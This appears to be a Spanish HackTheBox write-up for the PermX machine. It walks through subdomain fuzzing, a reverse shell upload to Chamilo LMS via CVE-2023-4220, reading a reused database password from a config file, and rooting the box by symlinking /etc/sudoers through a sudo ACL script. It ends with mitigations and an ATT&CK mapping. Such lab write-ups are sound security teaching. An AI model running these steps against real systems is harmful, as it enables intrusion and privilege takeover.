@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>PermX | ZsZsec</title>
+<meta content="Chamilo LMS, CVE, credenciales reutilizadas, sudo mal configurado, abuso de ACL y mapeo MITRE ATT&amp;CK." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>PermX<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / Chamilo / CVE</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">Chamilo</span><span class="tag">CVE</span><span class="tag">Linux</span><span class="tag">Sudo</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><hr/>
+<p>tags:</p>
+<ul>
+<li>CVE-2023-4220</li>
+<li>Nmap</li>
+<li>Chamilo</li>
+<li>web</li>
+<li>ACLs</li>
+<li>RCE</li>
+<li>FFUF</li>
+<li>Subdominios</li>
+<li>MITRE_ATTCK</li>
+<li>symlink_attack</li>
+</ul>
+<hr/>
+<p><strong>Hack The Box – PermX (Medium)</strong><br/>
+<strong>Autor:</strong> ZsZs<br/>
+<strong>Fecha:</strong> Julio 14, 2025
+<strong>Categoría:</strong> Linux – Web – Privilege Escalation<br/>
+<strong>URL de la máquina:</strong> <a href="https://app.hackthebox.com/machines/PermX">https://app.hackthebox.com/machines/PermX</a></p>
+<h2>Resumen</h2>
+<p>La máquina <strong>PermX</strong> de Hack The Box presenta un escenario realista que combina técnicas de enumeración de subdominios, explotación de una vulnerabilidad crítica (RCE no autenticado) en una plataforma educativa, extracción de credenciales, y escalada de privilegios a través del abuso de permisos ACL en un script <code>sudo</code>.</p>
+<p>Durante la resolución, se identificó un subdominio vulnerable con <strong>Chamilo LMS</strong>, el cual permitía la ejecución de comandos remotos mediante el exploit público de <strong>CVE-2023-4220</strong>. Posteriormente, se accedió a configuraciones internas que revelaron credenciales válidas, y se aprovechó un script mal validado para escalar privilegios a <code>root</code> manipulando el archivo <code>/etc/sudoers</code> mediante enlaces simbólicos.</p>
+<p><strong>Técnicas destacadas</strong>:</p>
+<ul>
+<li>Enumeración de subdominios</li>
+<li>Explotación de RCE (CVE-2023-4220)</li>
+<li>Extracción de credenciales en archivos de configuración</li>
+<li>Abuso de script con permisos <code>sudo</code> y validación débil</li>
+<li>Symlink y manipulación de permisos ACL</li>
+</ul>
+<h2>Reconocimiento</h2>
+<p>Para comenzar, realicé un escaneo completo de puertos con Nmap para identificar servicios abiertos y versiones:</p>
+<pre><code class="language-bash">nmap -A -sV -sC permx.htb -oA nmap/PermX
+</code></pre>
+<p><strong>Resultados relevantes:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Puerto</th>
+<th>Servicio</th>
+<th>Versión</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>SSH</td>
+<td>OpenSSH 8.9p1 Ubuntu</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.52 (Ubuntu)</td>
+</tr>
+</tbody>
+</table>
+<p>Al acceder a <code>http://permx.htb</code>, encontré un sitio web estático sin información relevante.</p>
+<p>Posteriormente, realicé una enumeración de subdominios con wfuzz para descubrir otros hosts virtuales en el dominio:</p>
+<pre><code class="language-bash">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 302,404 -H "Host: FUZZ.permx.htb" permx.htb
+</code></pre>
+<p>Esto reveló el subdominio <code>lms.permx.htb</code>.</p>
+<p>Agregué este subdominio al archivo <code>/etc/hosts</code> para poder acceder a él localmente.</p>
+<h2>Enumeración Web</h2>
+<p>Al acceder a <code>http://lms.permx.htb</code>, encontré una plataforma Chamilo LMS versión 1.11.24.</p>
+<p>Investigué las vulnerabilidades conocidas para esta versión y encontré el <strong>CVE-2023-4220</strong>, que permite ejecución remota de código (RCE) sin autenticación mediante la carga de archivos maliciosos.</p>
+<p>Para confirmar la vulnerabilidad, utilicé un exploit público disponible en GitHub, que permite subir un archivo PHP con una reverse shell.</p>
+<p>Ejecuté el siguiente comando para subir la shell y escuchar la conexión:</p>
+<pre><code class="language-bash">bash CVE-2023-4220.sh -f rev.php -h http://lms.permx.htb/ -p 443
+</code></pre>
+<p>La shell se estableció exitosamente y obtuve acceso como el usuario <code>www-data</code> en el servidor:</p>
+<pre><code class="language-bash">www-data@permx:/$
+</code></pre>
+<h2>Post-Explotación</h2>
+<p>Una vez con acceso como <code>www-data</code>, exploré el sistema en busca de información sensible. Encontré el archivo de configuración de Chamilo en:</p>
+<pre><code class="language-bash">/var/www/chamilo/app/config/configuration.php
+</code></pre>
+<p>Dentro de este archivo se encontraban las credenciales de conexión a la base de datos:</p>
+<pre><code class="language-bash">$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+</code></pre>
+<p>Al revisar otros usuarios y configuraciones del sistema, descubrí que el usuario <code>mtz</code> reutilizaba la misma contraseña, lo que permitió iniciar sesión como dicho usuario.</p>
+<p>Para confirmar los privilegios de <code>mtz</code>, ejecuté:</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<p>Y obtuve que podía ejecutar sin contraseña el script <code>/opt/acl.sh</code> con privilegios <code>sudo</code>.</p>
+<h2>Explicación detallada de la escalada de privilegios en PermX</h2>
+<h3>Contexto</h3>
+<p>El usuario <code>mtz</code> tiene permiso para ejecutar sin contraseña un script llamado <code>/opt/acl.sh</code> con privilegios <code>sudo</code>. Este script permite modificar los permisos ACL (Access Control List) de archivos, pero solo en archivos dentro del directorio <code>/home/mtz</code>.</p>
+<p>El script revisa que:</p>
+<ul>
+<li>Reciba 3 argumentos: usuario, permiso y archivo objetivo.</li>
+<li>El archivo objetivo esté dentro de <code>/home/mtz</code> (rechaza rutas que no estén ahí o contengan <code>..</code> para evitar escapes).</li>
+<li>El archivo objetivo sea un archivo regular.</li>
+</ul>
+<p>Luego ejecuta:</p>
+<pre><code class="language-bash">sudo setfacl -m u:"$user":"$perm" "$target"
+</code></pre>
+<p>Que modifica el ACL para dar permisos específicos al usuario indicado.</p>
+<h3>¿Por qué es vulnerable?</h3>
+<p>Aunque parece restringido a <code>/home/mtz</code>, no valida que el archivo objetivo no sea un <strong>enlace simbólico</strong> (symlink).</p>
+<p>Esto significa que si <code>mtz</code> crea un symlink dentro de <code>/home/mtz</code> que apunte, por ejemplo, a <code>/etc/sudoers</code>, puede usar el script para modificar los permisos ACL del archivo <code>/etc/sudoers</code>, que controla quién tiene acceso <code>sudo</code> en el sistema.</p>
+<h3>Paso a paso de la explotación</h3>
+<ol>
+<li><strong>Crear un symlink hacia <code>/etc/sudoers</code>:</strong></li>
+</ol>
+<pre><code class="language-bash">ln -s /etc/sudoers /home/mtz/tada
+</code></pre>
+<p>Ejecutar el script para dar permisos de lectura/escritura al usuario <code>mtz</code> sobre el symlink (que apunta a <code>/etc/sudoers</code>):</p>
+<pre><code class="language-bash">sudo /opt/acl.sh mtz rw /home/mtz/tada
+</code></pre>
+<p>Esto en realidad cambia los permisos ACL del archivo <code>/etc/sudoers</code>.</p>
+<ol start="3">
+<li><strong>Editar <code>/etc/sudoers</code> para agregar al usuario <code>mtz</code> con permisos completos sin contraseña:</strong></li>
+</ol>
+<pre><code class="language-bash">mtz ALL=(ALL:ALL) NOPASSWD: ALL
+</code></pre>
+<p>Ahora <code>mtz</code> puede ejecutar cualquier comando como root sin contraseña:</p>
+<pre><code class="language-bash">sudo su
+</code></pre>
+<p>Y obtener acceso root.</p>
+<h3>Resumen</h3>
+<p>La técnica se basa en:</p>
+<ul>
+<li><strong>Bypass de validaciones insuficientes</strong> del script, que solo verifica la ruta pero no si es un symlink.</li>
+<li><strong>Manipulación del sistema de archivos (symlink)</strong> para redirigir la modificación de permisos hacia un archivo sensible (<code>/etc/sudoers</code>).</li>
+<li><strong>Modificación de permisos ACL</strong> para hacerse sudoer sin restricciones.</li>
+</ul>
+<p>Este método es un ejemplo clásico de cómo un script mal diseñado con privilegios elevados puede llevar a una escalada total del sistema.</p>
+<h1>Cómo verificar si la validación del script es segura</h1>
+<h3>1. Validar que el archivo <strong>no sea un symlink</strong></h3>
+<ul>
+<li><p>El script debe verificar que el archivo objetivo <strong>no sea un enlace simbólico</strong>.</p>
+</li>
+<li><p>Esto se puede hacer en bash con:</p>
+</li>
+</ul>
+<pre><code class="language-bash">if [ -L "$target" ]; then   echo "Error: no se permiten enlaces simbólicos."   exit 1 fi
+</code></pre>
+<p>Si el script incluye una condición así, está previniendo el abuso con symlinks.</p>
+<hr/>
+<h3>2. Validar que el archivo esté realmente dentro del directorio permitido (no solo en la ruta textual)</h3>
+<ul>
+<li>Un atacante puede usar rutas como <code>/home/mtz/../etc/sudoers</code> para escapar.</li>
+<li>Por eso es mejor usar comandos que <strong>resuelven la ruta absoluta y real</strong> (resolviendo symlinks y referencias <code>..</code>), por ejemplo:</li>
+</ul>
+<pre><code class="language-bash">realpath_target=$(realpath "$target") allowed_dir="/home/mtz"  if [[ "$realpath_target" != $allowed_dir* ]]; then   echo "Error: archivo fuera del directorio permitido."   exit 1 fi
+</code></pre>
+<ul>
+<li>Esto asegura que el archivo realmente esté dentro del directorio permitido.</li>
+</ul>
+<hr/>
+<h3>3. Validar que el archivo sea realmente un archivo regular</h3>
+<ul>
+<li>Evitar que el objetivo sea directorio o dispositivo especial.</li>
+</ul>
+<pre><code class="language-bash">if [ ! -f "$target" ]; then   echo "Error: el objetivo no es un archivo regular."   exit 1 fi
+</code></pre>
+<hr/>
+<h3>4. Otras buenas prácticas</h3>
+<ul>
+<li><strong>No usar permisos <code>sudo</code> sin restricciones</strong>, limitar qué comandos o scripts puede ejecutar el usuario.</li>
+<li>Registrar las acciones para auditoría.</li>
+<li>Usar listas blancas de archivos permitidos cuando sea posible.</li>
+</ul>
+<h1>¿Cómo identificamos que el script <code>/opt/acl.sh</code> manipula ACLs?</h1>
+<p><strong>Buscar comandos relacionados con permisos:</strong></p>
+<ol>
+<li>En el script de PermX, se ve que usa:</li>
+</ol>
+<pre><code class="language-bash">/usr/bin/setfacl -m u:"$user":"$perm" "$target"
+</code></pre>
+<p>El comando <code>setfacl</code> es la pista principal: se usa para modificar las ACL (listas de control de acceso) de un archivo.</p>
+<ul>
+<li><p><strong>Analizar las validaciones:</strong><br/>
+El script valida que el archivo esté en <code>/home/mtz</code> y que sea un archivo regular, pero no comprueba si es un symlink.</p>
+</li>
+<li><p><strong>Interpretar la función:</strong><br/>
+El script está diseñado para otorgar permisos específicos a usuarios sobre archivos específicos sin dar acceso total, usando ACL.</p>
+</li>
+</ul>
+<h1>¿Cómo ocurre esto en la vida real?</h1>
+<p>Este tipo de vulnerabilidades surgen cuando:</p>
+<ul>
+<li><strong>Se crean scripts o herramientas internas para administrar permisos</strong> (como ACLs) de manera automatizada.</li>
+<li>Estos scripts se ejecutan con permisos elevados (<code>sudo</code> o como root) para facilitar tareas administrativas.</li>
+<li>Sin embargo, <strong>no se validan correctamente los parámetros</strong> o rutas que reciben, por ejemplo, no verifican si el archivo es un enlace simbólico o no controlan bien las rutas.</li>
+<li>Esto puede permitir que un usuario malintencionado <strong>manipule archivos críticos del sistema</strong> (como <code>/etc/sudoers</code>) indirectamente, escalando privilegios.</li>
+</ul>
+<h1>Ejemplo realístico</h1>
+<ul>
+<li><p>Imagina una empresa que tiene un script para que usuarios puedan compartir archivos con permisos específicos dentro de su carpeta personal, usando ACLs.</p>
+</li>
+<li><p>El script se ejecuta con <code>sudo</code> para modificar permisos sin pedir contraseña.</p>
+</li>
+<li><p>Pero si el script no verifica que el archivo sea legítimo y no un symlink, un usuario podría crear un enlace a archivos sensibles y alterar sus permisos, comprometiendo la seguridad del sistema.</p>
+<h1>Symlink Attack (Ataque de enlaces simbólicos)</h1>
+</li>
+</ul>
+<p>Un <strong>symlink</strong> es un archivo que apunta a otro. El ataque ocurre cuando un programa con privilegios accede a un symlink sin verificar su destino, permitiendo al atacante redirigir operaciones hacia archivos sensibles.</p>
+<p>Ejemplos de ataque:</p>
+<ul>
+<li><strong>TOCTOU (Time-of-Check to Time-of-Use)</strong>: El atacante crea un symlink entre la verificación y el uso del archivo por parte de una aplicación privilegiada.</li>
+<li><strong>Escalada de privilegios</strong>: Se crea un symlink hacia <code>/etc/shadow</code> o <code>/etc/sudoers</code>, y una aplicación con permisos escribe allí sin saberlo.</li>
+<li><strong>Manipulación de logs o configuraciones</strong>: Se apunta a archivos de configuración o logs para alterar su contenido sin tener acceso directo.</li>
+</ul>
+<p>🛡️ Mitigaciones:</p>
+<ul>
+<li>Verificar si el archivo es un symlink antes de abrirlo.</li>
+<li>Usar nombres aleatorios y permisos restrictivos para archivos temporales.</li>
+<li>Deshabilitar symlinks en directorios sensibles.</li>
+<li>Auditar actividad relacionada con symlinks</li>
+</ul>
+<h2>Conclusión</h2>
+<p>La máquina <strong>PermX</strong> representa un caso realista y completo de compromiso de un sistema Linux mediante una cadena de vulnerabilidades comunes pero críticas.</p>
+<p>Se comenzó con una enumeración tradicional que reveló un subdominio escondido y un servicio web vulnerable (Chamilo LMS) con una falla de ejecución remota de código no autenticada (CVE-2023-4220). Esta vulnerabilidad permitió un acceso inicial limitado como <code>www-data</code>.</p>
+<p>A partir de ahí, se aplicaron buenas prácticas de post-explotación: búsqueda de configuraciones sensibles y reutilización de credenciales, lo que facilitó el acceso a un usuario con mayores permisos.</p>
+<p>Finalmente, la escalada a root se logró aprovechando una mala configuración de un script <code>sudo</code> encargado de modificar permisos ACL, que no validaba correctamente la naturaleza del archivo objetivo, permitiendo el abuso de enlaces simbólicos para modificar el archivo <code>/etc/sudoers</code> y otorgar acceso completo a <code>mtz</code>.</p>
+<p>Esta máquina es un excelente ejemplo de cómo pequeñas negligencias en la administración de sistemas y la implementación de scripts con privilegios elevados pueden desencadenar fallos graves de seguridad.</p>
+<h1>MITRE ATT&amp;CK</h1>
+<table>
+<thead>
+<tr>
+<th><strong>Táctica</strong> (Estrategia)</th>
+<th><strong>Técnica</strong></th>
+<th><strong>ID</strong></th>
+<th><strong>Descripción y Aplicación en PermX</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reconnaissance</strong></td>
+<td><em>Active Scanning: TCP Port Scanning</em></td>
+<td>T1595.001</td>
+<td>Escaneo de puertos usando <code>nmap -A -sV -sC</code> para identificar servicios en ejecución (HTTP, SSH).</td>
+</tr>
+<tr>
+<td></td>
+<td><em>Active Scanning: DNS Enumeration</em></td>
+<td>T1596.002</td>
+<td>Enumeración de subdominios con <code>wfuzz</code> para descubrir <code>lms.permx.htb</code>.</td>
+</tr>
+<tr>
+<td><strong>Initial Access</strong></td>
+<td><em>Exploit Public-Facing Application</em></td>
+<td>T1190</td>
+<td>Explotación de Chamilo LMS mediante <strong>CVE-2023-4220</strong> para lograr ejecución remota de comandos.</td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td><em>Command and Scripting Interpreter: Bash</em></td>
+<td>T1059.004</td>
+<td>Se ejecutó una reverse shell en el servidor usando PHP y Bash para obtener acceso interactivo.</td>
+</tr>
+<tr>
+<td><strong>Persistence</strong></td>
+<td><em>Valid Accounts</em></td>
+<td>T1078</td>
+<td>Acceso al usuario <code>mtz</code> usando credenciales reales encontradas en el archivo de configuración.</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td><em>Abuse Elevation Control Mechanism: Sudo</em></td>
+<td>T1548.003</td>
+<td>Uso de un script <code>sudo</code> sin contraseña para modificar permisos ACL de archivos del sistema.</td>
+</tr>
+<tr>
+<td></td>
+<td><em>Exploitation for Privilege Escalation</em></td>
+<td>T1068</td>
+<td>Escalada a root mediante la modificación indirecta de <code>/etc/sudoers</code> con enlaces simbólicos.</td>
+</tr>
+<tr>
+<td><strong>Defense Evasion</strong></td>
+<td><em>Indicator Removal on Host: File Permission Modification</em></td>
+<td>T1070.006</td>
+<td>Modificación de permisos del archivo <code>/etc/sudoers</code> para ocultar rastros y ganar acceso persistente.</td>
+</tr>
+<tr>
+<td></td>
+<td><em>Impair Defenses: Disable or Modify Tools</em></td>
+<td>T1562.001</td>
+<td>(Implícito) El cambio de permisos ACL puede alterar la forma en que el sistema gestiona accesos.</td>
+</tr>
+<tr>
+<td><strong>Credential Access</strong></td>
+<td><em>Credentials in Configuration Files</em></td>
+<td>T1552.001</td>
+<td>Extracción de usuario y contraseña desde <code>configuration.php</code> de Chamilo.</td>
+</tr>
+<tr>
+<td><strong>Discovery</strong></td>
+<td><em>System Owner/User Discovery</em></td>
+<td>T1033</td>
+<td>Enumeración de usuarios válidos en el sistema (<code>mtz</code>) mediante inspección de archivos y entorno.</td>
+</tr>
+<tr>
+<td></td>
+<td><em>File and Directory Discovery</em></td>
+<td>T1083</td>
+<td>Búsqueda de archivos en <code>/var/www</code> y <code>/home</code> para encontrar configuraciones sensibles.</td>
+</tr>
+<tr>
+<td><strong>Collection</strong></td>
+<td><em>Data from Configuration Files</em></td>
+<td>T1602.002</td>
+<td>Lectura de archivos de configuración con credenciales y parámetros del sistema.</td>
+</tr>
+<tr>
+<td><strong>Command and Control</strong></td>
+<td><em>Ingress Tool Transfer</em></td>
+<td>T1105</td>
+<td>Transferencia del archivo <code>rev.php</code> al servidor vulnerable como parte de la explotación.</td>
+</tr>
+<tr>
+<td></td>
+<td><em>Application Layer Protocol: Web Protocols</em></td>
+<td>T1071.001</td>
+<td>Comunicación entre atacante y servidor usando HTTP y reverse shell sobre TCP/443.</td>
+</tr>
+<tr>
+<td><strong>Impact</strong></td>
+<td><em>Account Access Removal</em></td>
+<td>T1531</td>
+<td>(Potencial) El control sobre <code>/etc/sudoers</code> permitiría revocar accesos de otros usuarios.</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
